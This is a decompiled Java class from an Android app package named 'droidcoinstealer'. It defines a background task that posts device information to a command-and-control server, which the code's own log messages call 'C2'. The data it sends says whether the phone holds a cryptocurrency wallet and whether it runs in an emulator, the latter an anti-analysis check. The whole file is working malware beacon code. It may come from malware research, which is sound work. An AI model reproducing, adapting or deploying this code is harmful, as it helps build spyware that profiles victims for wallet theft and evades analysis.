package com.example.droidcoinstealer;

import android.os.AsyncTask;
import android.util.Log;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

/* renamed from: com.example.droidcoinstealer.C2 */
/* compiled from: MainActivity */
class C0272C2 extends AsyncTask<Void, Void, Void> {
    String hasWallet;
    String isEmulated;
    String path;
    Integer port;
    String url;

    C0272C2() {
    }

    /* access modifiers changed from: protected */
    public void onPreExecute() {
        super.onPreExecute();
    }

    /* access modifiers changed from: protected */
    public Void doInBackground(Void... params) {
        post();
        return null;
    }

    /* access modifiers changed from: protected */
    public void onPostExecute(Void result) {
        super.onPostExecute(result);
    }

    public void post() {
        String str = "DROIDCOINSTEALER";
        HttpClient httpclient = new DefaultHttpClient();
        try {
            URI uri = new URI("http", null, this.url, this.port.intValue(), this.path, null, null);
            HttpPost httppost = new HttpPost(uri);
            List<NameValuePair> nameValuePairs = new ArrayList<>(2);
            nameValuePairs.add(new BasicNameValuePair("hasWallet", this.hasWallet));
            nameValuePairs.add(new BasicNameValuePair("isEmulated", this.isEmulated));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                try {
                    Log.e(str, httpclient.execute(httppost).getStatusLine().toString());
                } catch (Throwable t) {
                    StringBuilder sb = new StringBuilder();
                    sb.append("Connection to C2 failed: ");
                    sb.append(t.toString());
                    Log.e(str, sb.toString());
                }
            } catch (Throwable th) {
                Log.e(str, "Failed to create C2-data");
            }
        } catch (Throwable th2) {
            Log.e(str, "Failed to create URI");
        }
    }
}
